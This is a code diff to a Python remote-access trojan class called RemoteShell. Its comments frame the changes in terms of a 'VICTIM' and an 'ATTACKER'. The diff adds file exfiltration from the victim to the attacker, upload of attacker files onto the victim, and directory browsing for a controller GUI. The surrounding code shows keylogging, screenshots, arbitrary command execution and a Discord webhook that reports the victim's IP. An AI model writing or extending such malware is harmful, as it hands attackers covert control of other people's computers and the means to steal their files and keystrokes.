@@ -26,7 +26,26 @@ class RemoteShell:
         self.PORT = port
         self.keystrokes = []
         self.command_history = []
-
+# This function is for the VICTIM to send a file TO the attacker (for downloading)
+    def send_file_to_attacker(self, filename, connection):
+        try:
+            with open(filename, 'rb') as file:
+                data = file.read()
+            # Protocol: BEGIN -> FILENAME -> DATA -> END
+            connection.sendall(b'BEGIN_DOWNLOAD')
+            time.sleep(0.1) # Small delay to ensure packets are processed separately
+            connection.sendall(f"{os.path.basename(filename)}".encode())
+            time.sleep(0.1)
+            connection.sendall(b'FILENAME_END')
+            time.sleep(0.1)
+            connection.sendall(data)
+            time.sleep(0.1)
+            connection.sendall(b'END_DOWNLOAD')
+            # No text response is needed here as the GUI will handle the binary data
+        except FileNotFoundError:
+            connection.send(f"Error: File not found '{filename}'\n".encode())
+        except Exception as e:
+            connection.send(f"Error sending file: {e}\n".encode())
     def send_ip_to_webhook(self, ip):
         webhook_url = "YOUR_DISCORD_WEBHOOK_URL"  # Replace with your webhook
         try:
@@ -42,17 +61,20 @@ class RemoteShell:
         except Exception as e:
             return str(e)
 
-    def upload_file(self, filename, connection):
+# This function is for the ATTACKER to upload a file TO the victim
+    def receive_file_from_attacker(self, filename, connection):
         try:
-            with open(filename, 'rb') as file:
-                data = file.read()
-            connection.sendall(b'BEGIN_UPLOAD')
-            connection.sendall(data)
-            connection.sendall(b'END_UPLOAD')
-            return f"File uploaded successfully\n"
+            # The controller should send data followed by a specific terminator
+            with open(filename, 'wb') as file:
+                while True:
+                    data = connection.recv(4096)
+                    if data.endswith(b'END_UPLOAD'):
+                        file.write(data[:-10]) # Write data without the terminator
+                        break
+                    file.write(data)
+            return f"File '{filename}' received successfully\n"
         except Exception as e:
-            return f"Failed to upload file: {e}\n"
-
+            return f"Failed to receive file: {e}\n"
     def save_screenshot(self, data):
         filename = 'remote_screenshot.png'
         with open(filename, 'wb') as file:
@@ -161,7 +183,15 @@ class RemoteShell:
             with Listener(on_press=self.on_press) as listener:
                 while True:
                     try:
-                        command = connection.recv(1024).decode().strip().lower()
+                        command_raw = connection.recv(1024).decode().strip()
+                        if not command_raw:
+                            continue
+                        
+                        # Split command into the command itself and its arguments
+                        command_parts = command_raw.split(' ', 1)
+                        command = command_parts[0].lower()
+                        args = command_parts[1] if len(command_parts) > 1 else ""
+
                         if command == 'exit':
                             break
                         elif command == 'cwd':
@@ -173,10 +203,29 @@ class RemoteShell:
                                 connection.send(f"Changed directory to: {os.getcwd()}\n".encode())
                             except FileNotFoundError:
                                 connection.send(f"Directory not found: {directory}\n".encode())
-                        elif command.startswith('upload '):
-                            filename = command.split(' ', 1)[1].strip()
-                            response = self.upload_file(filename, connection)
+                        elif command == 'download_file': # New command for file explorer download
+                            self.send_file_to_attacker(args, connection)
+
+                        elif command == 'upload': # This now calls the receiving function
+                            response = self.receive_file_from_attacker(args, connection)
                             connection.send(response.encode())
+                        elif command == 'ls':
+                            path = args if args else os.getcwd()
+                            try:
+                                files = os.listdir(path)
+                                result = []
+                                for file in files:
+                                    full_path = os.path.join(path, file)
+                                    # Prefix each item with its type for the GUI
+                                    if os.path.isdir(full_path):
+                                        result.append(f"DIR:{file}")
+                                    else:
+                                        result.append(f"FILE:{file}")
+                                # Wrap the result in markers for easy parsing
+                                response = "LS_RESULT_START\n" + "\n".join(result) + "\nLS_RESULT_END"
+                                connection.sendall(response.encode())
+                            except Exception as e:
+                                connection.send(f"Error listing directory: {e}\n".encode())
                         elif command == 'screenshot':
                             screenshot_data = self.remote_desktop()
                             connection.sendall(b'BEGIN_SCREENSHOT')
@@ -320,11 +369,7 @@ Available commands:
                             connection.send(help_text.encode())
                         elif command == 'cls':
                             pass
-                        elif command == 'ls':
-                            file_list = os.listdir()
-                            directory_list = [f"{item}/" if os.path.isdir(item) else item for item in file_list]
-                            file_list_str = "\n".join(directory_list)
-                            connection.send(file_list_str.encode())
+
                         else:
                             output = self.execute_command(command)
                             connection.send(output.encode())
